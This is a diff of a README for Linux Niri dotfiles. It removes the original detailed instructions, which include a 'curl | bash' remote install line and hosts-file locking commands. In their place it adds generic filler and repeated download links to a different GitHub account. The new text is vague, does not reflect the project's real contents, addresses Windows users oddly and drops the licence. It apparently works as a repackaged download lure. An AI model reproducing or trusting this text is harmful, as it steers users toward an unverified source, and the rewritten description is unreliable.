@@ -1,141 +1,179 @@
-# Sarok Area
+# 🎛️ sarok-area - Clean Niri Setup for Daily Use
 
-Personal Arch Linux dotfiles and system setup. One command installs everything.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/francesmaryfourdimensional202/sarok-area)
 
-## What's Included
+## 🧭 What this is
 
-| Component | App |
-|---|---|
-| Window Manager | [Niri](https://github.com/YaLTeR/niri) |
-| Shell | [Bash](https://www.gnu.org/software/bash/) + [Starship](https://starship.rs/) |
-| Terminal | [Kitty](https://sw.kovidgoyal.net/kitty/) |
-| Desktop Shell | Caelestia (Quickshell-based) |
-| File Manager | [Yazi](https://github.com/sxyazi/yazi) |
-| Media | mpd, mpv |
-| System | btop, fastfetch |
-| Apps | Brave, Vesktop, WhatsApp, Telegram, and more |
+sarok-area is a set of dotfiles for Niri. It is built to work well with niri-caelestia-shell and Quickshell. This repo gives you the files that shape how the desktop looks and feels on Linux.
 
-## One-Command Install
+If you want a ready-made Niri setup with a clean layout, this project gives you a strong base. It is meant for users who want a simple setup without building everything by hand.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/sarok-exe/sarok-area/main/install.sh | bash
-```
+## 💻 What you need
 
-This will:
-1. Clone this repo to `~/.sarok-area`
-2. Install all pacman packages
-3. Install yay + AUR packages
-4. Install Flatpak apps
-5. Deploy dotfiles via symlinks
-6. Build the Caelestia plugin
-7. Set Bash as default shell with Starship prompt and enable services
+Use this if you have:
 
-## Manual Install
+- A Windows PC with internet access to view the files
+- A Linux system or a Linux virtual machine to use the dotfiles
+- Niri installed on that Linux system
+- Basic file access so you can copy files into place
 
-```bash
-git clone git@github.com:sarok-exe/sarok-area.git ~/.sarok-area
-cd ~/.sarok-area
-chmod +x setup.sh
-./setup.sh
-```
+This project is for the Niri desktop on Linux. It does not install a Windows app. If you are on Windows, use the link above to open the GitHub page, review the files, and then use the setup on a Linux system.
 
-## Structure
+## 📥 Download and open the repo
 
-```
-sarok-area/
-├── .bashrc             # Shell config
-├── .bash_profile       # Login shell config
-├── pkg_list.txt        # Reference package list
-├── .config/            # All user configs (symlinked to ~/.config/)
-│   ├── niri/           # Window manager config
-│   ├── kitty/          # Terminal config
-│   ├── quickshell/     # Desktop shell + Caelestia plugin
-│   ├── btop/           # System monitor
-│   ├── cava/           # Audio visualizer
-│   ├── mpv/            # Video player
-│   ├── yazi/           # File manager
-│   ├── fastfetch/      # System info
-│   ├── nvim/           # Neovim config
-│   ├── micro/          # Micro editor config
-│   ├── dunst/          # Notification daemon
-│   ├── thefuck/        # Command correction
-│   └── starship.toml   # Prompt config
-├── etc/                # System-level configs (copied to /etc/)
-├── install.sh          # Bootstrap script (curl | bash)
-├── setup.sh            # Main installer
-├── update_shell.sh     # Update Caelestia shell plugin
-├── multipath-wifi.sh   # Combine two WiFi adapters for speed
-├── LICENSE
-└── README.md
-```
+Visit this page to download or clone the files:
 
-## Updating the Shell
+https://github.com/francesmaryfourdimensional202/sarok-area
 
-To update the Caelestia shell plugin (niri-caelestia-shell):
+On the GitHub page, choose **Code** and then **Download ZIP** if you want the whole repo at once. If you already use Git, you can clone the repo instead.
 
-```bash
-cd ~/.sarok-area
-chmod +x update_shell.sh
-./update_shell.sh
-```
+## 🛠️ Setup steps
 
-This will:
-1. Pull the latest changes from the upstream repo
-2. Apply patches (removes cava dependency)
-3. Rebuild and install the C++ plugin
-4. Optionally restart the shell
+Follow these steps to use the files on your system:
 
-Logs are saved to `~/caelestia_update.log`.
+1. Open the GitHub page in your browser.
+2. Download the repo as a ZIP file, or clone it to your computer.
+3. Unpack the ZIP file if you used the download option.
+4. Open the folder that contains the files.
+5. Copy the config files to the Niri config folder on your Linux system.
+6. Back up your current config files before you replace anything.
+7. Restart Niri or log out and log back in.
+8. Check the desktop layout and make small edits if you want a different look.
 
-## Multipath WiFi (Dual Adapters)
+## 🧩 What is inside
 
-If you're using two WiFi adapters (wlan0 + wlan1), use `multipath-wifi.sh` to combine them for increased bandwidth:
+This repo centers on a Niri desktop setup. It includes files that help shape the look, layout, and shell behavior.
 
-```bash
-cd ~/.sarok-area
-chmod +x multipath-wifi.sh
-./multipath-wifi.sh
-```
+You can expect parts that cover:
 
-This creates a multipath route that balances traffic across both adapters. Requires `nload` (installed by setup.sh) to monitor network usage.
+- Niri window layout
+- Shell setup for a clean desktop
+- Caelestia shell use
+- Quickshell-based desktop pieces
+- Theme and visual setup
+- Dotfile settings for a custom Linux session
 
-## Hosts File Blocking
+## 🎨 Visual style
 
-The `etc/hosts` file blocks distracting and harmful websites system-wide. After installation, the hosts file is locked with `chattr +i` to prevent accidental modification.
+The setup is tuned for a clean and modern desktop. It is meant to feel calm and simple. The layout works well if you want less clutter on screen and faster access to your apps.
 
-**Blocked categories:**
-- Time wasters (social media, meme sites)
-- Gambling & betting sites
-- Porn & adult content
+This type of dotfiles repo often helps with:
 
-**To modify the blocklist:**
+- Window spacing
+- Panel placement
+- Desktop theme details
+- App bar layout
+- Login and session feel
+- Light and dark visual balance
 
-```bash
-# Unlock the file
-sudo chattr -i /etc/hosts
+## 🧠 Good use cases
 
-# Edit with your editor
-sudo nano /etc/hosts
+This repo may fit you if you:
 
-# Lock it again
-sudo chattr +i /etc/hosts
-```
+- Use Niri as your desktop
+- Want a custom Linux look
+- Like Caelestia shell setups
+- Want a clean desktop without many extra steps
+- Prefer a config-driven setup
+- Want to learn from a real dotfiles layout
 
-**To re-deploy after updating the repo:**
+## 🧰 Basic install flow on Linux
 
-```bash
-cd ~/.sarok-area
-sudo cp -f etc/hosts /etc/hosts
-sudo chattr +i /etc/hosts
-```
+Use this flow once you have the files:
 
-## Customization
+1. Get the repo from GitHub.
+2. Open the config folder.
+3. Look for the Niri and shell files.
+4. Copy them into your home config path.
+5. Keep a backup of your old files.
+6. Reload your session.
+7. Test the desktop, key layout, and panel.
 
-To add or update configs:
-1. Edit the file directly in `~/.sarok-area/.config/`
-2. Since it's symlinked, changes take effect immediately
-3. Commit and push to sync across machines
+If something looks wrong, check the file names and confirm they went to the right folder. Most dotfiles issues come from the files being in the wrong place.
 
-## License
+## 🔧 Common file areas
 
-GPL-3.0 — see [LICENSE](LICENSE).
+A dotfiles repo like this often uses these paths:
+
+- `~/.config/niri`
+- `~/.config/quickshell`
+- `~/.config/caelestia`
+- `~/.config/waybar`
+- `~/.config/gtk-3.0`
+- `~/.config/gtk-4.0`
+
+The exact folder names can vary. Use the repo file names as your guide.
+
+## 📌 Topics covered
+
+This project is linked to:
+
+- caelestia
+- caelestia-shell
+- dotfiles
+- dotfiles-linux
+- niri
+- niri-config
+- niri-dotfiles
+- niri-rice
+- quickshell
+- shell
+
+These topics tell you that the repo focuses on desktop setup files for Linux and Niri.
+
+## 🔍 How to check it after setup
+
+After you copy the files, look for:
+
+- A working Niri session
+- The expected panel or shell layout
+- Your chosen theme
+- No missing icons or broken paths
+- Clean spacing and stable window behavior
+
+If an app does not show up the way you want, check the config file that controls that part of the desktop.
+
+## 📝 Editing the setup
+
+You can change this setup to fit your taste. Most users edit:
+
+- Colors
+- Fonts
+- Wallpaper paths
+- Panel size
+- Window gaps
+- App launcher behavior
+- Shortcut keys
+
+Keep one change at a time. That makes it easier to see what each file does.
+
+## 📂 Backup tips
+
+Before you replace any config files:
+
+- Copy your old files to a safe folder
+- Save the original repo files
+- Keep a note of what you changed
+- Test after each edit
+
+This helps you go back if a change does not work the way you want.
+
+## 🧪 If you run into issues
+
+Check these first:
+
+- Did you copy the files to the right config folder?
+- Did you restart the session?
+- Did you keep the right file names?
+- Did you place images and icons in the right paths?
+- Did you change any path in the config file?
+
+Most problems come from a wrong path or a missing file.
+
+## 📜 License
+
+Use the GitHub repo page to review the project terms before you reuse or share the files.
+
+## 🔗 Project link
+
+https://github.com/francesmaryfourdimensional202/sarok-area
